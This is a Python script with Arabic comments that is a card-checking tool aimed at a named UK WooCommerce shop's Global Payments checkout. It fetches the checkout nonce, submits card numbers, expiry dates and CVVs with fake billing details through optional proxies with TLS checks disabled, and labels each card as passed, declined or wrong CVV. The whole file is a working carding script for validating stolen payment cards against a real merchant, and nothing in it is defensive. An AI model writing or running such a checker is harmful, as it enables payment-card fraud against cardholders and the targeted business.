"""
بوابة الدفع: Global Passed LookUp GP-1
الموقع: pro-align.co.uk
نوع البوابة: Global Passed LookUp
تدفق الطلبات:
1. GET /checkout/ -> استخراج woocommerce-process-checkout-nonce
2. POST /?wc-ajax=checkout -> إرسال بيانات البطاقة والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import json


async def req1_get_checkout_nonce(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب woocommerce-process-checkout-nonce."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://pro-align.co.uk",
        "Referer": "https://pro-align.co.uk/checkout/",
    }
    try:
        async with session.get(
            "https://pro-align.co.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce = ""
        marker = 'name="woocommerce-process-checkout-nonce" value="'
        if marker in text:
            nonce = text.split(marker)[1].split('"')[0]
        return nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_checkout_nonce failed: {e}") from e


async def req2_submit_checkout(
    session: aiohttp.ClientSession,
    nonce: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إرسال طلب الدفع والحصول على نص الاستجابة."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://pro-align.co.uk",
        "Referer": "https://pro-align.co.uk/checkout/",
    }
    payload = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_company": "",
        "billing_country": "GB",
        "billing_address_1": "10 Downing Street",
        "billing_address_2": "",
        "billing_city": "London",
        "billing_state": "",
        "billing_postcode": "SW1A 2AA",
        "billing_phone": "07123456789",
        "billing_email": f"johndoe{uuid.uuid4().hex[:8]}@example.com",
        "order_comments": "",
        "payment_method": "globalpayments_hpp",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/checkout/",
        "globalpayments_hpp_card_number": cc,
        "globalpayments_hpp_card_expiry": f"{mes}/{ano[-2:]}",
        "globalpayments_hpp_card_cvc": cvv,
        "terms": "on",
        "terms-field": "1",
    }
    try:
        async with session.post(
            "https://pro-align.co.uk/?wc-ajax=checkout",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_submit_checkout failed: {e}") from e


async def process_GP_1_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global Passed LookUp GP-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            nonce = await req1_get_checkout_nonce(session, proxy_url)
            response_text = await req2_submit_checkout(session, nonce, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if '"result":"success"' in response_text or "thank-you" in response_text or "order-received" in response_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Passed"
    elif "insufficient_funds" in response_text or "declined" in response_text.lower() or "card_declined" in response_text:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    elif "security code is incorrect" in response_text.lower() or "cvv" in response_text.lower():
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Incorrect CVV"
    else:
        try:
            res_json = json.loads(response_text)
            response_msg = res_json.get("messages", "Error/Unknown")
            if isinstance(response_msg, list):
                response_msg = " ".join(response_msg)
            elif isinstance(response_msg, dict):
                response_msg = str(response_msg)
        except Exception:
            response_msg = "Error/Unknown"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", response_msg
